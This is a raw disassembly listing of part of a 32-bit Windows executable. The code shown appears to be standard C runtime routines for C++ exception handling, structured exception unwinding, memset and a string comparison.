  4024dd:	8d 04 47             	lea    (%edi,%eax,2),%eax
  4024e0:	8b 1c 81             	mov    (%ecx,%eax,4),%ebx
  4024e3:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4024e6:	8b 48 04             	mov    0x4(%eax),%ecx
  4024e9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4024ec:	85 c9                	test   %ecx,%ecx
  4024ee:	74 14                	je     0x402504
  4024f0:	8b d6                	mov    %esi,%edx
  4024f2:	e8 69 05 00 00       	call   0x402a60
  4024f7:	b1 01                	mov    $0x1,%cl
  4024f9:	88 4d ff             	mov    %cl,-0x1(%ebp)
  4024fc:	85 c0                	test   %eax,%eax
  4024fe:	78 14                	js     0x402514
  402500:	7f 48                	jg     0x40254a
  402502:	eb 03                	jmp    0x402507
  402504:	8a 4d ff             	mov    -0x1(%ebp),%cl
  402507:	8b fb                	mov    %ebx,%edi
  402509:	83 fb fe             	cmp    $0xfffffffe,%ebx
  40250c:	75 c9                	jne    0x4024d7
  40250e:	84 c9                	test   %cl,%cl
  402510:	74 2e                	je     0x402540
  402512:	eb 20                	jmp    0x402534
  402514:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40251b:	eb 17                	jmp    0x402534
  40251d:	83 ff fe             	cmp    $0xfffffffe,%edi
  402520:	74 1e                	je     0x402540
  402522:	68 40 90 41 00       	push   $0x419040
  402527:	56                   	push   %esi
  402528:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  40252d:	8b cb                	mov    %ebx,%ecx
  40252f:	e8 8c 05 00 00       	call   0x402ac0
  402534:	56                   	push   %esi
  402535:	ff 75 f8             	push   -0x8(%ebp)
  402538:	e8 f3 fe ff ff       	call   0x402430
  40253d:	83 c4 08             	add    $0x8,%esp
  402540:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402543:	5f                   	pop    %edi
  402544:	5e                   	pop    %esi
  402545:	5b                   	pop    %ebx
  402546:	8b e5                	mov    %ebp,%esp
  402548:	5d                   	pop    %ebp
  402549:	c3                   	ret
  40254a:	8b 45 08             	mov    0x8(%ebp),%eax
  40254d:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  402553:	75 38                	jne    0x40258d
  402555:	83 3d d0 21 41 00 00 	cmpl   $0x0,0x4121d0
  40255c:	74 2f                	je     0x40258d
  40255e:	68 d0 21 41 00       	push   $0x4121d0
  402563:	e8 a8 e7 00 00       	call   0x410d10
  402568:	83 c4 04             	add    $0x4,%esp
  40256b:	85 c0                	test   %eax,%eax
  40256d:	74 1b                	je     0x40258a
  40256f:	8b 35 d0 21 41 00    	mov    0x4121d0,%esi
  402575:	8b ce                	mov    %esi,%ecx
  402577:	6a 01                	push   $0x1
  402579:	ff 75 08             	push   0x8(%ebp)
  40257c:	ff 15 48 21 41 00    	call   *0x412148
  402582:	ff d6                	call   *%esi
  402584:	8b 75 f0             	mov    -0x10(%ebp),%esi
  402587:	83 c4 08             	add    $0x8,%esp
  40258a:	8b 45 08             	mov    0x8(%ebp),%eax
  40258d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402590:	8b d0                	mov    %eax,%edx
  402592:	e8 09 05 00 00       	call   0x402aa0
  402597:	8b 45 0c             	mov    0xc(%ebp),%eax
  40259a:	39 78 0c             	cmp    %edi,0xc(%eax)
  40259d:	74 12                	je     0x4025b1
  40259f:	68 40 90 41 00       	push   $0x419040
  4025a4:	56                   	push   %esi
  4025a5:	8b d7                	mov    %edi,%edx
  4025a7:	8b c8                	mov    %eax,%ecx
  4025a9:	e8 12 05 00 00       	call   0x402ac0
  4025ae:	8b 45 0c             	mov    0xc(%ebp),%eax
  4025b1:	56                   	push   %esi
  4025b2:	ff 75 f8             	push   -0x8(%ebp)
  4025b5:	89 58 0c             	mov    %ebx,0xc(%eax)
  4025b8:	e8 73 fe ff ff       	call   0x402430
  4025bd:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4025c0:	83 c4 08             	add    $0x8,%esp
  4025c3:	8b d6                	mov    %esi,%edx
  4025c5:	8b 49 08             	mov    0x8(%ecx),%ecx
  4025c8:	e8 b3 04 00 00       	call   0x402a80
  4025cd:	cc                   	int3
  4025ce:	e8 41 06 00 00       	call   0x402c14
  4025d3:	84 c0                	test   %al,%al
  4025d5:	75 03                	jne    0x4025da
  4025d7:	32 c0                	xor    %al,%al
  4025d9:	c3                   	ret
  4025da:	e8 e4 05 00 00       	call   0x402bc3
  4025df:	84 c0                	test   %al,%al
  4025e1:	75 07                	jne    0x4025ea
  4025e3:	e8 68 06 00 00       	call   0x402c50
  4025e8:	eb ed                	jmp    0x4025d7
  4025ea:	b0 01                	mov    $0x1,%al
  4025ec:	c3                   	ret
  4025ed:	55                   	push   %ebp
  4025ee:	8b ec                	mov    %esp,%ebp
  4025f0:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  4025f4:	75 0a                	jne    0x402600
  4025f6:	e8 fb 05 00 00       	call   0x402bf6
  4025fb:	e8 50 06 00 00       	call   0x402c50
  402600:	b0 01                	mov    $0x1,%al
  402602:	5d                   	pop    %ebp
  402603:	c3                   	ret
  402604:	55                   	push   %ebp
  402605:	8b ec                	mov    %esp,%ebp
  402607:	8b 45 08             	mov    0x8(%ebp),%eax
  40260a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40260d:	3b c1                	cmp    %ecx,%eax
  40260f:	75 04                	jne    0x402615
  402611:	33 c0                	xor    %eax,%eax
  402613:	5d                   	pop    %ebp
  402614:	c3                   	ret
  402615:	83 c1 05             	add    $0x5,%ecx
  402618:	83 c0 05             	add    $0x5,%eax
  40261b:	8a 10                	mov    (%eax),%dl
  40261d:	3a 11                	cmp    (%ecx),%dl
  40261f:	75 18                	jne    0x402639
  402621:	84 d2                	test   %dl,%dl
  402623:	74 ec                	je     0x402611
  402625:	8a 50 01             	mov    0x1(%eax),%dl
  402628:	3a 51 01             	cmp    0x1(%ecx),%dl
  40262b:	75 0c                	jne    0x402639
  40262d:	83 c0 02             	add    $0x2,%eax
  402630:	83 c1 02             	add    $0x2,%ecx
  402633:	84 d2                	test   %dl,%dl
  402635:	75 e4                	jne    0x40261b
  402637:	eb d8                	jmp    0x402611
  402639:	1b c0                	sbb    %eax,%eax
  40263b:	83 c8 01             	or     $0x1,%eax
  40263e:	5d                   	pop    %ebp
  40263f:	c3                   	ret
  402640:	6a 08                	push   $0x8
  402642:	68 a8 74 41 00       	push   $0x4174a8
  402647:	e8 c4 f3 ff ff       	call   0x401a10
  40264c:	8b 45 08             	mov    0x8(%ebp),%eax
  40264f:	85 c0                	test   %eax,%eax
  402651:	0f 84 81 00 00 00    	je     0x4026d8
  402657:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  40265d:	75 79                	jne    0x4026d8
  40265f:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  402663:	75 73                	jne    0x4026d8
  402665:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  40266c:	74 12                	je     0x402680
  40266e:	81 78 14 21 05 93 19 	cmpl   $0x19930521,0x14(%eax)
  402675:	74 09                	je     0x402680
  402677:	81 78 14 22 05 93 19 	cmpl   $0x19930522,0x14(%eax)
  40267e:	75 58                	jne    0x4026d8
  402680:	8b 48 1c             	mov    0x1c(%eax),%ecx
  402683:	85 c9                	test   %ecx,%ecx
  402685:	74 51                	je     0x4026d8
  402687:	8b 51 04             	mov    0x4(%ecx),%edx
  40268a:	85 d2                	test   %edx,%edx
  40268c:	74 2c                	je     0x4026ba
  40268e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402695:	52                   	push   %edx
  402696:	ff 70 18             	push   0x18(%eax)
  402699:	e8 4a 00 00 00       	call   0x4026e8
  40269e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4026a5:	eb 31                	jmp    0x4026d8
  4026a7:	ff 75 0c             	push   0xc(%ebp)
  4026aa:	ff 75 ec             	push   -0x14(%ebp)
  4026ad:	e8 43 00 00 00       	call   0x4026f5
  4026b2:	59                   	pop    %ecx
  4026b3:	59                   	pop    %ecx
  4026b4:	c3                   	ret
  4026b5:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4026b8:	eb e4                	jmp    0x40269e
  4026ba:	f6 01 10             	testb  $0x10,(%ecx)
  4026bd:	74 19                	je     0x4026d8
  4026bf:	8b 40 18             	mov    0x18(%eax),%eax
  4026c2:	8b 08                	mov    (%eax),%ecx
  4026c4:	85 c9                	test   %ecx,%ecx
  4026c6:	74 10                	je     0x4026d8
  4026c8:	8b 01                	mov    (%ecx),%eax
  4026ca:	51                   	push   %ecx
  4026cb:	8b 70 08             	mov    0x8(%eax),%esi
  4026ce:	8b ce                	mov    %esi,%ecx
  4026d0:	ff 15 48 21 41 00    	call   *0x412148
  4026d6:	ff d6                	call   *%esi
  4026d8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4026db:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4026e2:	59                   	pop    %ecx
  4026e3:	5f                   	pop    %edi
  4026e4:	5e                   	pop    %esi
  4026e5:	5b                   	pop    %ebx
  4026e6:	c9                   	leave
  4026e7:	c3                   	ret
  4026e8:	55                   	push   %ebp
  4026e9:	8b ec                	mov    %esp,%ebp
  4026eb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4026ee:	ff 55 0c             	call   *0xc(%ebp)
  4026f1:	5d                   	pop    %ebp
  4026f2:	c2 08 00             	ret    $0x8
  4026f5:	55                   	push   %ebp
  4026f6:	8b ec                	mov    %esp,%ebp
  4026f8:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  4026fc:	74 32                	je     0x402730
  4026fe:	56                   	push   %esi
  4026ff:	57                   	push   %edi
  402700:	8b 7d 08             	mov    0x8(%ebp),%edi
  402703:	8b 37                	mov    (%edi),%esi
  402705:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  40270b:	75 21                	jne    0x40272e
  40270d:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  402711:	75 1b                	jne    0x40272e
  402713:	81 7e 14 20 05 93 19 	cmpl   $0x19930520,0x14(%esi)
  40271a:	74 18                	je     0x402734
  40271c:	81 7e 14 21 05 93 19 	cmpl   $0x19930521,0x14(%esi)
  402723:	74 0f                	je     0x402734
  402725:	81 7e 14 22 05 93 19 	cmpl   $0x19930522,0x14(%esi)
  40272c:	74 06                	je     0x402734
  40272e:	5f                   	pop    %edi
  40272f:	5e                   	pop    %esi
  402730:	33 c0                	xor    %eax,%eax
  402732:	5d                   	pop    %ebp
  402733:	c3                   	ret
  402734:	e8 ea 03 00 00       	call   0x402b23
  402739:	89 70 10             	mov    %esi,0x10(%eax)
  40273c:	8b 77 04             	mov    0x4(%edi),%esi
  40273f:	e8 df 03 00 00       	call   0x402b23
  402744:	89 70 14             	mov    %esi,0x14(%eax)
  402747:	e8 20 3d 00 00       	call   0x40646c
  40274c:	cc                   	int3
  40274d:	55                   	push   %ebp
  40274e:	8b ec                	mov    %esp,%ebp
  402750:	e8 ce 03 00 00       	call   0x402b23
  402755:	8b 40 24             	mov    0x24(%eax),%eax
  402758:	85 c0                	test   %eax,%eax
  40275a:	74 0e                	je     0x40276a
  40275c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40275f:	39 08                	cmp    %ecx,(%eax)
  402761:	74 0c                	je     0x40276f
  402763:	8b 40 04             	mov    0x4(%eax),%eax
  402766:	85 c0                	test   %eax,%eax
  402768:	75 f5                	jne    0x40275f
  40276a:	33 c0                	xor    %eax,%eax
  40276c:	40                   	inc    %eax
  40276d:	5d                   	pop    %ebp
  40276e:	c3                   	ret
  40276f:	33 c0                	xor    %eax,%eax
  402771:	5d                   	pop    %ebp
  402772:	c3                   	ret
  402773:	55                   	push   %ebp
  402774:	8b ec                	mov    %esp,%ebp
  402776:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402779:	8b 55 08             	mov    0x8(%ebp),%edx
  40277c:	56                   	push   %esi
  40277d:	8b 01                	mov    (%ecx),%eax
  40277f:	8b 71 04             	mov    0x4(%ecx),%esi
  402782:	03 c2                	add    %edx,%eax
  402784:	85 f6                	test   %esi,%esi
  402786:	78 0d                	js     0x402795
  402788:	8b 49 08             	mov    0x8(%ecx),%ecx
  40278b:	8b 14 16             	mov    (%esi,%edx,1),%edx
  40278e:	8b 0c 0a             	mov    (%edx,%ecx,1),%ecx
  402791:	03 ce                	add    %esi,%ecx
  402793:	03 c1                	add    %ecx,%eax
  402795:	5e                   	pop    %esi
  402796:	5d                   	pop    %ebp
  402797:	c3                   	ret
  402798:	55                   	push   %ebp
  402799:	8b ec                	mov    %esp,%ebp
  40279b:	56                   	push   %esi
  40279c:	8b 75 08             	mov    0x8(%ebp),%esi
  40279f:	57                   	push   %edi
  4027a0:	8b 3e                	mov    (%esi),%edi
  4027a2:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%edi)
  4027a8:	74 12                	je     0x4027bc
  4027aa:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%edi)
  4027b0:	74 0a                	je     0x4027bc
  4027b2:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%edi)
  4027b8:	74 1b                	je     0x4027d5
  4027ba:	eb 13                	jmp    0x4027cf
  4027bc:	e8 62 03 00 00       	call   0x402b23
  4027c1:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  4027c5:	7e 08                	jle    0x4027cf
  4027c7:	e8 57 03 00 00       	call   0x402b23
  4027cc:	ff 48 18             	decl   0x18(%eax)
  4027cf:	5f                   	pop    %edi
  4027d0:	33 c0                	xor    %eax,%eax
  4027d2:	5e                   	pop    %esi
  4027d3:	5d                   	pop    %ebp
  4027d4:	c3                   	ret
  4027d5:	e8 49 03 00 00       	call   0x402b23
  4027da:	89 78 10             	mov    %edi,0x10(%eax)
  4027dd:	8b 76 04             	mov    0x4(%esi),%esi
  4027e0:	e8 3e 03 00 00       	call   0x402b23
  4027e5:	89 70 14             	mov    %esi,0x14(%eax)
  4027e8:	e8 7f 3c 00 00       	call   0x40646c
  4027ed:	cc                   	int3
  4027ee:	e8 30 03 00 00       	call   0x402b23
  4027f3:	83 c0 10             	add    $0x10,%eax
  4027f6:	c3                   	ret
  4027f7:	e8 27 03 00 00       	call   0x402b23
  4027fc:	83 c0 14             	add    $0x14,%eax
  4027ff:	c3                   	ret
  402800:	e9 67 3c 00 00       	jmp    0x40646c
  402805:	cc                   	int3
  402806:	cc                   	int3
  402807:	cc                   	int3
  402808:	cc                   	int3
  402809:	cc                   	int3
  40280a:	cc                   	int3
  40280b:	cc                   	int3
  40280c:	cc                   	int3
  40280d:	cc                   	int3
  40280e:	cc                   	int3
  40280f:	cc                   	int3
  402810:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402814:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  402819:	8b d7                	mov    %edi,%edx
  40281b:	8b 7c 24 04          	mov    0x4(%esp),%edi
  40281f:	85 c9                	test   %ecx,%ecx
  402821:	0f 84 3c 01 00 00    	je     0x402963
  402827:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  40282d:	83 f9 20             	cmp    $0x20,%ecx
  402830:	0f 86 df 00 00 00    	jbe    0x402915
  402836:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40283c:	0f 82 8b 00 00 00    	jb     0x4028cd
  402842:	0f ba 25 d4 99 41 00 	btl    $0x1,0x4199d4
  402849:	01 
  40284a:	73 09                	jae    0x402855
  40284c:	f3 aa                	rep stos %al,%es:(%edi)
  40284e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402852:	8b fa                	mov    %edx,%edi
  402854:	c3                   	ret
  402855:	0f ba 25 18 90 41 00 	btl    $0x1,0x419018
  40285c:	01 
  40285d:	0f 83 b2 00 00 00    	jae    0x402915
  402863:	66 0f 6e c0          	movd   %eax,%xmm0
  402867:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  40286c:	03 cf                	add    %edi,%ecx
  40286e:	0f 11 07             	movups %xmm0,(%edi)
  402871:	83 c7 10             	add    $0x10,%edi
  402874:	83 e7 f0             	and    $0xfffffff0,%edi
  402877:	2b cf                	sub    %edi,%ecx
  402879:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40287f:	76 4c                	jbe    0x4028cd
  402881:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402888:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40288f:	90                   	nop
  402890:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  402894:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  402899:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
  40289e:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
  4028a3:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
  4028a8:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
  4028ad:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
  4028b2:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
  4028b7:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  4028bd:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  4028c3:	f7 c1 00 ff ff ff    	test   $0xffffff00,%ecx
  4028c9:	75 c5                	jne    0x402890
  4028cb:	eb 13                	jmp    0x4028e0
  4028cd:	0f ba 25 18 90 41 00 	btl    $0x1,0x419018
  4028d4:	01 
  4028d5:	73 3e                	jae    0x402915
  4028d7:	66 0f 6e c0          	movd   %eax,%xmm0
  4028db:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  4028e0:	83 f9 20             	cmp    $0x20,%ecx
  4028e3:	72 1c                	jb     0x402901
  4028e5:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  4028e9:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  4028ee:	83 c7 20             	add    $0x20,%edi
  4028f1:	83 e9 20             	sub    $0x20,%ecx
  4028f4:	83 f9 20             	cmp    $0x20,%ecx
  4028f7:	73 ec                	jae    0x4028e5
  4028f9:	f7 c1 1f 00 00 00    	test   $0x1f,%ecx
  4028ff:	74 62                	je     0x402963
  402901:	8d 7c 0f e0          	lea    -0x20(%edi,%ecx,1),%edi
  402905:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  402909:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  40290e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402912:	8b fa                	mov    %edx,%edi
  402914:	c3                   	ret
  402915:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40291b:	74 0e                	je     0x40292b
  40291d:	88 07                	mov    %al,(%edi)
  40291f:	47                   	inc    %edi
  402920:	83 e9 01             	sub    $0x1,%ecx
  402923:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  402929:	75 f2                	jne    0x40291d
  40292b:	f7 c1 04 00 00 00    	test   $0x4,%ecx
  402931:	74 08                	je     0x40293b
  402933:	89 07                	mov    %eax,(%edi)
  402935:	83 c7 04             	add    $0x4,%edi
  402938:	83 e9 04             	sub    $0x4,%ecx
  40293b:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  402941:	74 20                	je     0x402963
  402943:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40294a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402950:	89 07                	mov    %eax,(%edi)
  402952:	89 47 04             	mov    %eax,0x4(%edi)
  402955:	83 c7 08             	add    $0x8,%edi
  402958:	83 e9 08             	sub    $0x8,%ecx
  40295b:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  402961:	75 ed                	jne    0x402950
  402963:	8b 44 24 04          	mov    0x4(%esp),%eax
  402967:	8b fa                	mov    %edx,%edi
  402969:	c3                   	ret
  40296a:	cc                   	int3
  40296b:	cc                   	int3
  40296c:	cc                   	int3
  40296d:	cc                   	int3
  40296e:	cc                   	int3
  40296f:	cc                   	int3
  402970:	53                   	push   %ebx
  402971:	56                   	push   %esi
  402972:	57                   	push   %edi
  402973:	8b 54 24 10          	mov    0x10(%esp),%edx
  402977:	8b 44 24 14          	mov    0x14(%esp),%eax
  40297b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40297f:	55                   	push   %ebp
  402980:	52                   	push   %edx
  402981:	50                   	push   %eax
  402982:	51                   	push   %ecx
  402983:	51                   	push   %ecx
  402984:	68 10 2a 40 00       	push   $0x402a10
  402989:	64 ff 35 00 00 00 00 	push   %fs:0x0
  402990:	a1 40 90 41 00       	mov    0x419040,%eax
  402995:	33 c4                	xor    %esp,%eax
  402997:	89 44 24 08          	mov    %eax,0x8(%esp)
  40299b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4029a2:	8b 44 24 30          	mov    0x30(%esp),%eax
  4029a6:	8b 58 08             	mov    0x8(%eax),%ebx
  4029a9:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4029ad:	33 19                	xor    (%ecx),%ebx
  4029af:	8b 70 0c             	mov    0xc(%eax),%esi
  4029b2:	83 fe fe             	cmp    $0xfffffffe,%esi
  4029b5:	0f 84 46 00 00 00    	je     0x402a01
  4029bb:	8b 54 24 34          	mov    0x34(%esp),%edx
  4029bf:	83 fa fe             	cmp    $0xfffffffe,%edx
  4029c2:	74 08                	je     0x4029cc
  4029c4:	3b f2                	cmp    %edx,%esi
  4029c6:	0f 86 35 00 00 00    	jbe    0x402a01
  4029cc:	8d 34 76             	lea    (%esi,%esi,2),%esi
  4029cf:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  4029d3:	8b 0b                	mov    (%ebx),%ecx
  4029d5:	89 48 0c             	mov    %ecx,0xc(%eax)
  4029d8:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  4029dc:	0f 85 c0 ff ff ff    	jne    0x4029a2
  4029e2:	68 01 01 00 00       	push   $0x101
  4029e7:	8b 43 08             	mov    0x8(%ebx),%eax
  4029ea:	e8 a1 02 00 00       	call   0x402c90
  4029ef:	b9 01 00 00 00       	mov    $0x1,%ecx
  4029f4:	8b 43 08             	mov    0x8(%ebx),%eax
  4029f7:	e8 b4 02 00 00       	call   0x402cb0
  4029fc:	e9 a1 ff ff ff       	jmp    0x4029a2
  402a01:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402a08:	83 c4 18             	add    $0x18,%esp
  402a0b:	5f                   	pop    %edi
  402a0c:	5e                   	pop    %esi
  402a0d:	5b                   	pop    %ebx
  402a0e:	c3                   	ret
  402a0f:	cc                   	int3
  402a10:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402a14:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  402a1b:	b8 01 00 00 00       	mov    $0x1,%eax
  402a20:	74 33                	je     0x402a55
  402a22:	8b 44 24 08          	mov    0x8(%esp),%eax
  402a26:	8b 48 08             	mov    0x8(%eax),%ecx
  402a29:	33 c8                	xor    %eax,%ecx
  402a2b:	e8 4b f3 ff ff       	call   0x401d7b
  402a30:	55                   	push   %ebp
  402a31:	8b 68 18             	mov    0x18(%eax),%ebp
  402a34:	ff 70 0c             	push   0xc(%eax)
  402a37:	ff 70 10             	push   0x10(%eax)
  402a3a:	ff 70 14             	push   0x14(%eax)
  402a3d:	e8 2e ff ff ff       	call   0x402970
  402a42:	83 c4 0c             	add    $0xc,%esp
  402a45:	5d                   	pop    %ebp
  402a46:	8b 44 24 08          	mov    0x8(%esp),%eax
  402a4a:	8b 54 24 10          	mov    0x10(%esp),%edx
  402a4e:	89 02                	mov    %eax,(%edx)
  402a50:	b8 03 00 00 00       	mov    $0x3,%eax
  402a55:	c3                   	ret
  402a56:	cc                   	int3
  402a57:	cc                   	int3
  402a58:	cc                   	int3
  402a59:	cc                   	int3
  402a5a:	cc                   	int3
  402a5b:	cc                   	int3
  402a5c:	cc                   	int3
  402a5d:	cc                   	int3
  402a5e:	cc                   	int3
  402a5f:	cc                   	int3
  402a60:	55                   	push   %ebp
  402a61:	56                   	push   %esi
  402a62:	57                   	push   %edi
  402a63:	53                   	push   %ebx
  402a64:	8b ea                	mov    %edx,%ebp
  402a66:	33 c0                	xor    %eax,%eax
  402a68:	33 db                	xor    %ebx,%ebx
  402a6a:	33 d2                	xor    %edx,%edx
  402a6c:	33 f6                	xor    %esi,%esi
  402a6e:	33 ff                	xor    %edi,%edi
  402a70:	ff d1                	call   *%ecx
  402a72:	5b                   	pop    %ebx
  402a73:	5f                   	pop    %edi
  402a74:	5e                   	pop    %esi
  402a75:	5d                   	pop    %ebp
  402a76:	c3                   	ret
  402a77:	cc                   	int3
  402a78:	cc                   	int3
  402a79:	cc                   	int3
  402a7a:	cc                   	int3
  402a7b:	cc                   	int3
  402a7c:	cc                   	int3
  402a7d:	cc                   	int3
  402a7e:	cc                   	int3
  402a7f:	cc                   	int3
  402a80:	8b ea                	mov    %edx,%ebp
  402a82:	8b f1                	mov    %ecx,%esi
  402a84:	8b c1                	mov    %ecx,%eax
  402a86:	6a 01                	push   $0x1
  402a88:	e8 03 02 00 00       	call   0x402c90
  402a8d:	33 c0                	xor    %eax,%eax
  402a8f:	33 db                	xor    %ebx,%ebx
  402a91:	33 c9                	xor    %ecx,%ecx
  402a93:	33 d2                	xor    %edx,%edx
  402a95:	33 ff                	xor    %edi,%edi
  402a97:	ff e6                	jmp    *%esi
  402a99:	cc                   	int3
  402a9a:	cc                   	int3
  402a9b:	cc                   	int3
  402a9c:	cc                   	int3
  402a9d:	cc                   	int3
  402a9e:	cc                   	int3
  402a9f:	cc                   	int3
  402aa0:	55                   	push   %ebp
  402aa1:	8b ec                	mov    %esp,%ebp
  402aa3:	53                   	push   %ebx
  402aa4:	56                   	push   %esi
  402aa5:	57                   	push   %edi
  402aa6:	6a 00                	push   $0x0
  402aa8:	52                   	push   %edx
  402aa9:	68 b5 2a 40 00       	push   $0x402ab5
  402aae:	51                   	push   %ecx
  402aaf:	ff 15 64 20 41 00    	call   *0x412064
  402ab5:	5f                   	pop    %edi
  402ab6:	5e                   	pop    %esi
  402ab7:	5b                   	pop    %ebx
  402ab8:	5d                   	pop    %ebp
  402ab9:	c3                   	ret
  402aba:	cc                   	int3
  402abb:	cc                   	int3
  402abc:	cc                   	int3
  402abd:	cc                   	int3
  402abe:	cc                   	int3
  402abf:	cc                   	int3
  402ac0:	55                   	push   %ebp
  402ac1:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  402ac5:	52                   	push   %edx
  402ac6:	51                   	push   %ecx
  402ac7:	ff 74 24 14          	push   0x14(%esp)
  402acb:	e8 a0 fe ff ff       	call   0x402970
  402ad0:	83 c4 0c             	add    $0xc,%esp
  402ad3:	5d                   	pop    %ebp
  402ad4:	c2 08 00             	ret    $0x8
  402ad7:	55                   	push   %ebp
  402ad8:	8b ec                	mov    %esp,%ebp
  402ada:	81 3d 48 21 41 00 74 	cmpl   $0x401774,0x412148
  402ae1:	17 40 00 
  402ae4:	74 1f                	je     0x402b05
  402ae6:	64 8b 0d 18 00 00 00 	mov    %fs:0x18,%ecx
  402aed:	8b 45 08             	mov    0x8(%ebp),%eax
  402af0:	8b 80 c4 00 00 00    	mov    0xc4(%eax),%eax
  402af6:	3b 41 08             	cmp    0x8(%ecx),%eax
  402af9:	72 05                	jb     0x402b00
  402afb:	3b 41 04             	cmp    0x4(%ecx),%eax
  402afe:	76 05                	jbe    0x402b05
  402b00:	6a 0d                	push   $0xd
  402b02:	59                   	pop    %ecx
  402b03:	cd 29                	int    $0x29
  402b05:	5d                   	pop    %ebp
  402b06:	c3                   	ret
  402b07:	55                   	push   %ebp
  402b08:	8b ec                	mov    %esp,%ebp
  402b0a:	8b 45 08             	mov    0x8(%ebp),%eax
  402b0d:	85 c0                	test   %eax,%eax
  402b0f:	74 0e                	je     0x402b1f
  402b11:	3d f8 9c 41 00       	cmp    $0x419cf8,%eax
  402b16:	74 07                	je     0x402b1f
  402b18:	50                   	push   %eax
  402b19:	e8 92 39 00 00       	call   0x4064b0
  402b1e:	59                   	pop    %ecx
  402b1f:	5d                   	pop    %ebp
  402b20:	c2 04 00             	ret    $0x4
  402b23:	e8 09 00 00 00       	call   0x402b31
  402b28:	85 c0                	test   %eax,%eax
  402b2a:	0f 84 2f 3a 00 00    	je     0x40655f
  402b30:	c3                   	ret
  402b31:	83 3d 90 90 41 00 ff 	cmpl   $0xffffffff,0x419090
  402b38:	75 03                	jne    0x402b3d
  402b3a:	33 c0                	xor    %eax,%eax
  402b3c:	c3                   	ret
  402b3d:	53                   	push   %ebx
  402b3e:	57                   	push   %edi
  402b3f:	ff 15 68 20 41 00    	call   *0x412068
  402b45:	ff 35 90 90 41 00    	push   0x419090
  402b4b:	8b f8                	mov    %eax,%edi
  402b4d:	e8 c2 02 00 00       	call   0x402e14
  402b52:	8b d8                	mov    %eax,%ebx
  402b54:	59                   	pop    %ecx
  402b55:	83 fb ff             	cmp    $0xffffffff,%ebx
  402b58:	74 17                	je     0x402b71
  402b5a:	85 db                	test   %ebx,%ebx
  402b5c:	75 59                	jne    0x402bb7
  402b5e:	6a ff                	push   $0xffffffff
  402b60:	ff 35 90 90 41 00    	push   0x419090
  402b66:	e8 e4 02 00 00       	call   0x402e4f
  402b6b:	59                   	pop    %ecx
  402b6c:	59                   	pop    %ecx
  402b6d:	85 c0                	test   %eax,%eax
  402b6f:	75 04                	jne    0x402b75
  402b71:	33 db                	xor    %ebx,%ebx
  402b73:	eb 42                	jmp    0x402bb7
  402b75:	56                   	push   %esi
  402b76:	6a 28                	push   $0x28
